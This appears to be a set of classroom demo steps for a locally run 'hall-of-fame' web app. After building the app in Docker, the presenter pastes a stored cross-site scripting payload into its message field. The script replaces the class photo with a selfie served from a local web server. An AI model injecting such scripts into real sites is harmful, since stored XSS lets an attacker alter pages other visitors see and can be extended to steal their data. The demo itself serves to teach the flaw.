
1. `git clone` the project. #Copy the code
2. `docker build -t hall-of-fame .`  #build the container
3. `docker run -p 5000:5000 hall-of-fame` #run the container
4. `python3 -m http.server 9999` Run the temporary webserver from /Home/Pictures/TmpWebServer/
5. Visit the page in a browser from the demoworkstation: http://127.0.0.1:5000
6. Provoke the class: **Are we sure that this is really the best class ever?  what if it was us?**
7. Take selfie with the class.  Copy the picture to the directory /Home/Pictures/TmpWebServer/  Rename it as pic.jpg
8. insert the following code in the message field & hit submit:

```<script>
setTimeout(function() {
    var photos = document.getElementsByClassName('class-photo');
    if (photos.length > 0) {
        photos[0].src = 'http://127.0.0.1:9999/pic.jpg';
    }
}, 100);
</script>

